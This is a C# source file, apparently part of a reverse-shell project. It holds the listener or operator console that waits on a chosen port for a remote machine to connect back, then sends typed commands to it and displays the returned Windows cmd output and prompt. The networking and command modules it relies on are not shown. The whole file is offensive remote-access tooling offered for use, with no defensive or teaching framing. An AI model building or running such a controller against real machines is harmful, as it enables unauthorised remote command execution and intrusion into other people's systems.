using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Commands;
using NetworkManager;
using Shared;

namespace ReverseShellClient
{
    public class ClientManager
    {
        bool processingCommand;


        public ClientManager()
        {
            processingCommand = false;
            Console.ForegroundColor = ConsoleColor.Green;
        }


        public void Start()
        {
            var listen = true;

            while (listen)
            {
                Console.Write(@"Please type a port number to listen to : ");
                var port = 0;
                while (port == 0)
                {
                    try
                    {
                        port = int.Parse(Console.ReadLine());
                    }
                    catch (Exception)
                    {
                        Console.WriteLine(@"... please ...");
                    }
                }

                // Listen and start connection
                GlobalNetworkManager.clientNetworkManager.ListenAndConnect(port);

                // Process data sent by the server in a new task
                var runClient = new Task(ProcessIncomingData);
                runClient.Start();

                // Process user input
                ProcessInput();
                
                // Connection ended, ask listen again
                listen = AskListenAgain();
            }
        }


        void ProcessIncomingData()
        {
            while (true)
            {
                try
                {
                    var data = GlobalNetworkManager.ReadLine();
                    if (data == null)
                    {
                        continue;
                    }// to remove ??

                    var command = CommandsManager.GetCommandByFlag(data);
                    if (command != null)
                    {
                        // Call client method
                        command.ClientMethod(null);
                        processingCommand = false;
                    }
                    else
                    {
                        // Normal output (text)
                        // Check if the line isn't the one representing the path in the cmd
                        if (!(data[data.Length - 1] == '>' && data.Contains(@":\")))
                        {
                            // Add line return
                            Console.WriteLine(data);
                        }
                        else
                        {
                            // Display cmd path without line return
                            Console.Write(data);
                        }
                    }
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }


        void ProcessInput()
        {
            while (true)
            {
                // If the connection was closed, break from the loop
                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    processingCommand = false;
                    break;
                }
                // If not allowed to send commands, continue
                if (processingCommand)
                {
                    continue;
                }

                var commandString = Console.ReadLine();

                // Test again after the readline
                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
                {
                    break;
                }


                if (commandString == "clear" || commandString == "cls")
                {
                    // Clear console
                    Console.Clear();
                    GlobalNetworkManager.SayHello();
                }
                else if (commandString == "")
                {
                    GlobalNetworkManager.SayHello();
                }
                else
                {
                    var splittedCommand = commandString.Split(' ').ToList();
                    var commandName = splittedCommand[0];

                    var command = CommandsManager.GetCommandByName(commandName);
                    if (command != null)
                    {
                        var arguments = new List<string>();

                        if (splittedCommand.Count > 1)
                        {
                            arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
                        }


                        if (commandString.Contains("help")){
                            // Help commands section
                            if (commandString == "help")
                            {
                                CommandsManager.ShowGlobalHelp();
                            }
                            else
                            {
                                CommandsManager.ShowCommandHelp(command);
                            }

                            GlobalNetworkManager.SayHello();
                            continue;
                        }


                        if (!CommandsManager.CheckCommandSyntax(command, arguments))
                        {
                            ColorTools.WriteCommandError($"Syntax error, check out the command's help page ({commandName} help)");
                            continue;
                        }


                        var preProcessResult = true;
                        try
                        {
                            preProcessResult = command.PreProcessCommand(arguments);
                        }
                        catch (NotImplementedException)
                        {
                            // Ignored
                        }

                        if (!preProcessResult)
                        {
                            // Error in the PreProcess method
                            GlobalNetworkManager.SayHello();
                            continue;
                        }


                        if (command.isLocal)
                        {
                            command.ClientMethod(arguments);
                            GlobalNetworkManager.SayHello();
                            continue;
                        }
                        

                        // Will have to wait for the process to finish in order to issue commands again
                        processingCommand = true;
                    }

                    // Send the data to the server
                    GlobalNetworkManager.WriteLine(commandString);
                }
            }
        }


        bool AskListenAgain()
        {
            Console.Write("Listen again ? (y/N) ");
            var input = Console.ReadLine();
            Console.Clear();

            return input == "y" || input == "Y";
        }


        void Cleanup()
        {
            try
            {
                GlobalNetworkManager.clientNetworkManager.Cleanup(processingCommand);
            }
            catch (Exception)
            {
                // Ignored
            }
        }
    }
}
